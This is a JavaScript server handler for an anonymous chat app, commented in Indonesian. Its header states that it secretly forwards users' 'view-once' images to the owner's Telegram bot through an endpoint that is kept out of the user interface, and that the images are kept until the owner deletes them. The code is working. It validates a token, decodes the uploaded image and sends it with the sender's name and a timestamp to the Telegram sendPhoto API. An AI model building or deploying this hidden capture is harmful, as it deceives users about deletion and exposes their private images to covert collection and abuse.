/* ============================================================
 * AnonChat — teruskan gambar view-once ke bot Telegram Bos.
 * RAHASIA: endpoint ini tidak disebut di mana pun di UI.
 * Client mengirim JPEG (max FHD, sudah dikompres) + token gate.
 * File tersimpan di chat bot sampai Bos hapus sendiri.
 * ============================================================ */
import { createHmac, timingSafeEqual } from "crypto";

const SECRET = process.env.GATE_SECRET || "";
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const OWNER_CHAT_ID = process.env.TELEGRAM_OWNER_CHAT_ID || "";
const TOKEN_TTL_MS = 24 * 3600 * 1000;
const MAX_B64_LEN = 3000000; // ~2,2 MB file

function validToken(token) {
  const parts = String(token || "").split(".");
  if (parts.length !== 3 || !SECRET) return false;
  const [ts, rand, sig] = parts;
  if (!/^\d+$/.test(ts) || !/^[a-f0-9]{32}$/.test(rand) || !/^[a-f0-9]{64}$/.test(sig)) return false;
  if (Date.now() - parseInt(ts, 10) > TOKEN_TTL_MS) return false;
  const expect = createHmac("sha256", SECRET).update(ts + "." + rand).digest("hex");
  const a = Buffer.from(sig, "utf8"), b = Buffer.from(expect, "utf8");
  return a.length === b.length && timingSafeEqual(a, b);
}

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).json({ ok: false });
  let body = req.body;
  if (typeof body === "string") { try { body = JSON.parse(body); } catch { body = {}; } }

  if (!validToken(body && body.token)) return res.status(401).json({ ok: false });
  if (!BOT_TOKEN || !OWNER_CHAT_ID) return res.status(500).json({ ok: false, error: "config" });

  const img = String((body && body.image) || "");
  const m = img.match(/^data:image\/(jpeg|jpg|png|webp);base64,([A-Za-z0-9+/=\r\n]+)$/);
  if (!m || m[2].length > MAX_B64_LEN) return res.status(400).json({ ok: false, error: "image" });

  let buf;
  try { buf = Buffer.from(m[2], "base64"); }
  catch { return res.status(400).json({ ok: false, error: "image" }); }
  if (!buf.length) return res.status(400).json({ ok: false, error: "image" });

  const name = String((body && body.name) || "Anonim").slice(0, 32);
  const waktu = new Date().toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    day: "numeric", month: "short", year: "numeric",
    hour: "2-digit", minute: "2-digit",
  }).replace(".", ":");
  const caption = "Gambar AnonChat\nDari: " + name + "\n" + waktu + " WIB";

  try {
    const fd = new FormData();
    fd.append("chat_id", OWNER_CHAT_ID);
    fd.append("caption", caption);
    fd.append("photo", new Blob([buf], { type: "image/jpeg" }), "anonchat.jpg");
    const r = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
      method: "POST",
      body: fd,
    });
    const j = await r.json();
    return res.status(200).json({ ok: !!j.ok });
  } catch {
    return res.status(502).json({ ok: false, error: "telegram" });
  }
}
